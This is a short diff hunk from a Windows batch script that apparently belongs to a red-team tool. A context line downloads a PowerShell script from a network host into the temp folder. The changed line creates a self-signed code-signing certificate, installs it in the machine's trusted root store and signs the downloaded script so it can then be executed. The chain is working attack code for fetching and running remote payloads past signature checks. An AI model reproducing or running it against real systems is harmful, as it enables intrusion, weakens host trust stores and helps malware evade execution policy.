@@ -101,7 +101,7 @@ powershell -C (New-Object Net.WebClient).DownloadFile('http://192.168.1.71/my_po
 timeout /T 2 >nul
 
 :: Code to digitally sign Our Downloaded PS script (my_posh_script.ps1) { This certificate expires in six months }
-powershell $cert = New-SelfSignedCertificate -Subject "My Code Signing Certificate” -FriendlyName "SsaRedTeam" -NotAfter (Get-Date).AddMonths(6) -Type CodeSigningCert -CertStoreLocation cert:\LocalMachine\My;Move-Item -Path $cert.PSPath -Destination "Cert:\CurrentUser\Root";Set-AuthenticodeSignature -FilePath $env:tmp\my_posh_script.ps1 -Certificate $cert
+powershell $cert = New-SelfSignedCertificate -Subject "My Code Signing Certificate” -FriendlyName "SsaRedTeam" -NotAfter (Get-Date).AddMonths(6) -Type CodeSigningCert -CertStoreLocation cert:\LocalMachine\My;Move-Item -Path $cert.PSPath -Destination "Cert:\LocalMachine\Root";Set-AuthenticodeSignature -FilePath $env:tmp\my_posh_script.ps1 -Certificate $cert
 timeout /T 2 >nul
 
 :: Code to Execute our Downloaded script
